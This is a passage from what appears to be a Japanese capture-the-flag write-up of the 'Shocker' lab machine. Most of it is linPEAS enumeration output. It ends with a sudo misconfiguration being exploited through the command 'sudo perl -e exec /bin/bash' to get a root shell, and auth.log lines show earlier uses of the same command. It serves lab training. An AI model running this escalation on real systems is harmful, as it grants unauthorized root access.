CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                                                                      
/etc/ld.so.conf                                                                                                                                                                                                                             
Content of /etc/ld.so.conf:                                                                                                                                                                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                                                                                               
  - /usr/local/lib                                                                                                                                                                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                                                                                                                                   
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                                                                            
total 24                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Sep 21  2022 .
drwxr-xr-x 90 root root 4096 Sep 21  2022 ..
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rw-r--r--  1 root root  101 Jun 29  2016 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3310 Apr 12  2016 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Jun 30  2016 usr.bin.lxc-start
-rw-r--r-- 1 root root  3612 Apr 29  2016 usr.bin.ubuntu-core-launcher
-rw-r--r-- 1 root root   281 Jun 30  2016 usr.lib.lxd.lxd-bridge-proxy
-rw-r--r-- 1 root root 15854 Aug 31  2017 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1469 Sep  8  2017 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/shelly/.bash_history
/home/shelly/user.txt
/home/shelly/.selected_editor
/root/
/var/www
/var/www/html
/var/www/html/index.html
/var/www/html/bug.jpg

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-r--r--r-- 1 root root 33 Apr 30 02:34 /home/shelly/user.txt                                                                                                                                                                                
-rw-r--r-- 1 root root 66 Sep 22  2017 /home/shelly/.selected_editor

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 183927 Apr 30 11:51 /var/log/apport.log                                                                                                                                                                               
-rw-r----- 1 root adm 0 Sep 22  2017 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 16982841 Apr 30 11:56 /var/log/apache2/error.log
-rw-r----- 1 root adm 24903043 Apr 30 11:51 /var/log/apache2/access.log
-rw-r----- 1 root adm 158410 Sep 21  2022 /var/log/apt/term.log
-rw-r----- 1 root adm 31 Jul 19  2016 /var/log/fsck/checkroot
-rw-r----- 1 root adm 31 Jul 19  2016 /var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Jul 19  2016 /var/log/dmesg

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/home/shelly
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/crash/.lock
/var/crash/_usr_lib_cgi-bin_user.sh.1000.crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-Shockerx2dvg-swap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dShockerx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2dA8Nf2cf3f9JkrekQJrNARDzwv0j098QCY3Ohk3T8fhG01Olf9I72klADFcrUCqAM.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-08de6626x2d5748x2d4eb3x2d9dbfx2da23d65a00ac9.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-Shockerx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens192.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug-tracing.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
  Group shelly:                                                                                                                                                                                                                             
/tmp/FlrYi                                                                                                                                                                                                                                  
/tmp/lTixo



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2025-04-30+06:27:10.0876097420 /var/crash/.lock                                                                                                                                                                                             
2025-04-30+03:10:15.5279397490 /tmp/lTixo
2025-04-30+02:37:28.6199946890 /tmp/FlrYi
2017-09-22+15:29:26.4755541040 /usr/lib/cgi-bin/user.sh

╔══════════╣ Unexpected in root
/.bash_history                                                                                                                                                                                                                              
/vmlinuz
/.viminfo
/initrd.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                                                                                                                                                                             
/var/log/kern.log
/var/log/apache2/error.log
/var/log/auth.log
/home/shelly/.gnupg/gpg.conf
/home/shelly/.gnupg/trustdb.gpg
/home/shelly/.gnupg/pubring.gpg
/tmp/peas.txt


╔══════════╣ Files inside /home/shelly (limit 20)
total 40                                                                                                                                                                                                                                    
drwxr-xr-x 5 shelly shelly 4096 Apr 30 11:57 .
drwxr-xr-x 3 root   root   4096 Sep 21  2022 ..
lrwxrwxrwx 1 root   root      9 Sep 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
drwx------ 2 shelly shelly 4096 Sep 21  2022 .cache
drwx------ 2 shelly shelly 4096 Apr 30 11:57 .gnupg
drwxrwxr-x 2 shelly shelly 4096 Sep 21  2022 .nano
-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
-r--r--r-- 1 root   root     33 Apr 30 02:34 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.html                                                                                                                                                                                                                    
/var/www/html/bug.jpg

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup folders
drwx------ 2 root root 4096 Apr 30 02:34 /etc/lvm/backup                                                                                                                                                                                    
drwxr-xr-x 2 root root 4096 Apr 30 06:25 /var/backups
total 528
-rw-r--r-- 1 root root    40960 Apr 30 06:25 alternatives.tar.0
-rw-r--r-- 1 root root     5780 Sep 21  2022 apt.extended_states.0
-rw-r--r-- 1 root root      803 Sep 22  2017 apt.extended_states.1.gz
-rw-r--r-- 1 root root       11 Sep 22  2017 dpkg.arch.0
-rw-r--r-- 1 root root      437 Sep 22  2017 dpkg.diversions.0
-rw-r--r-- 1 root root      170 Sep 22  2017 dpkg.statoverride.0
-rw-r--r-- 1 root root   458166 Sep 21  2022 dpkg.status.0
-rw------- 1 root root      801 Sep 22  2017 group.bak
-rw------- 1 root shadow    674 Sep 22  2017 gshadow.bak
-rw------- 1 root root     1567 Sep 22  2017 passwd.bak
-rw------- 1 root shadow   1041 Sep 22  2017 shadow.bak


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 128 Sep 22  2017 /var/lib/sgml-base/supercatalog.old                                                                                                                                                                 
-rw-r--r-- 1 root root 190528 Sep 12  2017 /usr/src/linux-headers-4.4.0-96-generic/.config.old
-rw-r--r-- 1 root root 0 Sep 12  2017 /usr/src/linux-headers-4.4.0-96-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Sep 12  2017 /usr/src/linux-headers-4.4.0-96-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 11358 Sep 22  2017 /usr/share/info/dir.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 8710 Sep 12  2017 /lib/modules/4.4.0-96-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Sep 12  2017 /lib/modules/4.4.0-96-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 673 Sep 22  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Sep 22  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 20 Apr 15  2016 /etc/vmware-tools/tools.conf.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/lxd/lxd.db: SQLite 3.x database                                                                                                                                                                                              
Found /var/lib/mlocate/mlocate.db: regular file, no read permission

 -> Extracting tables from /var/lib/lxd/lxd.db (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 12K
drwxr-xr-x  3 root root 4.0K Sep 21  2022 .
drwxr-xr-x 14 root root 4.0K Sep 21  2022 ..
drwxr-xr-x  2 root root 4.0K Sep 21  2022 html

/var/www/html:
total 48K
drwxr-xr-x 2 root root 4.0K Sep 21  2022 .
drwxr-xr-x 3 root root 4.0K Sep 21  2022 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rwxrwxrwx 1 root root 0 Apr 30 06:27 /var/crash/.lock                                                                                                                                                                                      
-rw-r--r-- 1 root root 0 Apr 30 02:34 /run/network/.ifstate.lock
-rw-r--r-- 1 shelly shelly 220 Sep 22  2017 /home/shelly/.bash_logout
-rw-r--r-- 1 root root 66 Sep 22  2017 /home/shelly/.selected_editor
-rw-r--r-- 1 root root 1391 Sep 22  2017 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Jul 19  2016 /etc/.pwd.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 shelly shelly 4714 Apr 30 03:16 /tmp/gP3HYlNv                                                                                                                                                                                  
-rw-r--r-- 1 shelly shelly 128697 Apr 30 11:57 /tmp/peas.txt
-rwxrwxrwx 1 shelly shelly 207 Apr 30 02:37 /tmp/FlrYi
-rwxrwxrwx 1 shelly shelly 207 Apr 30 03:10 /tmp/lTixo
-rw-r--r-- 1 root root 40960 Apr 30 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 11 Sep 22  2017 /var/backups/dpkg.arch.0

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/apache2/access.log:10.10.14.70 - - [30/Apr/2025:05:47:51 -0400] "GET /cgi-bin/.htpasswd HTTP/1.1" 403 465 "-" "Fuzz Faster U Fool v2.1.0-dev"                                                                                      
/var/log/apt/term.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5.3_amd64.deb ...
/var/log/apt/term.log:Setting up passwd (1:4.2-3.1ubuntu5.3) ...
/var/log/apt/term.log:Unpacking passwd (1:4.2-3.1ubuntu5.3) over (1:4.2-3.1ubuntu5) ...
/var/log/auth.log:Apr 30 09:26:23 Shocker sudo:   shelly : TTY=unknown ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=/usr/bin/perl -e exec "/bin/bash";
/var/log/auth.log:Apr 30 11:49:42 Shocker sudo:   shelly : TTY=unknown ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=/usr/bin/perl -e exec "/bin/bash";
/var/log/auth.log:Apr 30 11:57:33 Shocker sudo:   shelly : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=list
/var/log/auth.log:Sep 22 12:35:31 Shocker sudo:   shelly : TTY=tty1 ; PWD=/home/shelly ; USER=root ; COMMAND=/bin/su
/var/log/auth.log:Sep 22 14:11:15 Shocker sudo:   shelly : TTY=tty1 ; PWD=/home/shelly ; USER=root ; COMMAND=/bin/su
/var/log/auth.log:Sep 22 15:31:55 Shocker passwd[3310]: pam_unix(passwd:chauthtok): password changed for root
/var/log/auth.log:Sep 22 15:32:23 Shocker passwd[3311]: pam_unix(passwd:chauthtok): password changed for shelly
/var/log/auth.log:Sep 22 15:34:10 Shocker sshd[3323]: Failed password for root from 10.10.10.1 port 29663 ssh2
/var/log/auth.log:Sep 22 15:34:22 Shocker sshd[3323]: Failed password for root from 10.10.10.1 port 29663 ssh2
/var/log/auth.log:Sep 22 15:34:42 Shocker sshd[3323]: message repeated 2 times: [ Failed password for root from 10.10.10.1 port 29663 ssh2]
/var/log/auth.log:Sep 22 15:36:41 Shocker sshd[3347]: Accepted password for root from 10.10.10.1 port 30757 ssh2
/var/log/auth.log:Sep 22 15:41:22 Shocker sudo: pam_unix(sudo:auth): auth could not identify password for [shelly]
/var/log/auth.log:Sep 22 15:42:37 Shocker gpasswd[3617]: members of group sudo set by root to
/var/log/auth.log:Sep 22 15:42:46 Shocker sudo: pam_unix(sudo:auth): auth could not identify password for [shelly]
/var/log/auth.log:Sep 22 15:42:48 Shocker sudo:   shelly : TTY=tty1 ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=/usr/bin/crontab -e
/var/log/auth.log:Sep 22 15:50:40 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
/var/log/auth.log:Sep 22 15:51:15 Shocker sudo:   shelly : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh tester.sh
/var/log/auth.log:Sep 22 15:51:15 Shocker sudo: pam_unix(sudo:auth): auth could not identify password for [shelly]
/var/log/auth.log:Sep 22 15:52:28 Shocker sshd[1427]: Accepted password for root from 10.10.10.1 port 37027 ssh2
/var/log/auth.log:Sep 22 15:52:40 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
/var/log/auth.log:Sep 22 15:56:20 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/perl -e exec "/bin/sh";
/var/log/auth.log:Sep 22 15:57:32 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/perl -e exec "/bin/bash";
/var/log/auth.log:Sep 25 08:21:08 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=list
/var/log/auth.log:Sep 25 08:21:58 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=/usr/bin/perl -e /bin/bash
/var/log/auth.log:Sep 25 08:22:45 Shocker sudo:   shelly : TTY=pts/0 ; PWD=/usr/lib/cgi-bin ; USER=root ; COMMAND=/usr/bin/perl -e exec "/bin/bash"
/var/log/auth.log:Sep 25 08:28:44 Shocker sshd[1521]: Accepted password for root from 10.10.14.2 port 44308 ssh2
/var/log/auth.log:Sep 25 08:32:52 Shocker sshd[1293]: Accepted password for root from 10.10.14.2 port 44328 ssh2
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log:2016-07-19 20:43:06 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:06 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:06 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:06 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:06 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:06 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:08 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:08 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:08 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:08 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:13 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2016-07-19 20:43:13 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2016-07-19 20:43:13 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2016-07-19 20:43:16 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log:2016-07-19 20:43:16 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:16 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:16 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2016-07-19 20:43:21 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log:2016-07-19 20:43:21 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2016-07-19 20:43:21 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2016-07-19 20:43:21 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-09-22 12:40:47 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-09-22 12:40:47 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-09-22 12:40:47 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-09-22 12:40:47 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2017-09-22 12:40:47 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                                                                                                                                                                          
Regexes to search for API keys aren't activated, use param '-r' 
```
CVEの脆弱性も確認できたが、Sudoの設定不備も確認  
パスワードなしでROOT権限でPerlを実行できるらしい
```sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for shelly on Shocker:                                                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
perlでBashを起動、権限昇格成功！
```sh
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'exec "/bin/bash";'
id
uid=0(root) gid=0(root) groups=0(root)
```
